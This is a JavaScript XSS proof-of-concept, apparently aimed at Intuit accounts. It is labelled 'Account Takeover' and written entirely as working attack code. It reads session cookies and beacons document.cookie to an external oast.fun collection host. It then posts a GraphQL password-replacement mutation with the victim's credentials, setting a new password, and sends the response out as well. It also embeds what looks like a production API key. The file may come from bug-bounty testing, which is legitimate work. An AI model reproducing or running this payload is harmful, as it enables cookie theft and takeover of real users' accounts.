(async function(){
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var log=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}

function uid(){
return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){
var r=Math.random()*16|0;return(c==='x'?r:(r&0x3|0x8)).toString(16)
})
}

var sid=gc('ius_session');
var vid=gc('ivid');
var userId=gc('userIdentifier')||gc('qbn.uidp')||gc('VY2zkPS.userIdentifier')||gc('VY2zkPS.uidp')||gc('VY30DBw.uidp');

log.push('ius_session: '+sid);
log.push('userIdentifier: '+gc('userIdentifier'));
log.push('qbn.uidp: '+gc('qbn.uidp'));
log.push('VY2zkPS.userIdentifier: '+gc('VY2zkPS.userIdentifier'));
log.push('VY2zkPS.uidp: '+gc('VY2zkPS.uidp'));
log.push('userId resolved: '+(userId||'NONE'));

(new Image).src=O+'/xss-cookies?c='+encodeURIComponent(document.cookie);

var hdrs={
'Content-Type':'application/json',
'Authorization':'Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0',
'intuit_offeringid':'Intuit.cto.iam.ius',
'intuit_intentassetalias':'Intuit.cto.iam.ius',
'intuit_flowid':uid(),
'intuit_tid':uid()
};
if(sid){hdrs['intuit_sessionid']=sid;hdrs['intuit_profilingid']=sid}
if(vid) hdrs['intuit_visitorid']=vid;
if(userId) hdrs['intuit_routingid']=userId;

log.push('intuit_routingid set: '+(userId?'YES':'NO'));

try{
var r=await fetch('https://accounts.intuit.com/identity-api/v2/graphql',{
method:'POST',credentials:'include',headers:hdrs,
body:JSON.stringify({
query:'mutation ReplacePassword($input:Identity_CreateOrReplacePasswordCredentialInput!){identityCreateOrReplacePasswordCredential(input:$input){__typename ...on Identity_CreateOrReplacePasswordCredentialSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}...on Identity_DigitalIdentityLockedOutError{message}}}',
variables:{input:{newPassword:'Poc@2027'}},
operationName:'ReplacePassword'
})
});

var txt=await r.text();
log.push('status: '+r.status);
log.push('body: '+txt);
(new Image).src=O+'/xss-pwd?s='+r.status+'&b='+encodeURIComponent(txt.substring(0,500));

document.body.innerHTML='<div style="font:13px monospace;background:#111;color:#0f0;padding:20px;min-height:100vh;word-break:break-all">'
+'<h1 style="color:red">XSS PoC — Account Takeover</h1>'
+'<h2 style="color:orange">Debug</h2>'
+'<pre style="color:#0f0;white-space:pre-wrap">'+log.join('\n')+'</pre>'
+'<h2 style="color:orange">Password Change Response</h2>'
+'<pre style="color:yellow;white-space:pre-wrap">'+txt+'</pre></div>'

}catch(e){
log.push('ERROR: '+e.message);
(new Image).src=O+'/xss-err?e='+encodeURIComponent(e.message);
document.body.innerHTML='<div style="font:13px monospace;background:#111;color:red;padding:20px"><h1>Error</h1><pre>'+log.join('\n')+'</pre></div>'
}
})();
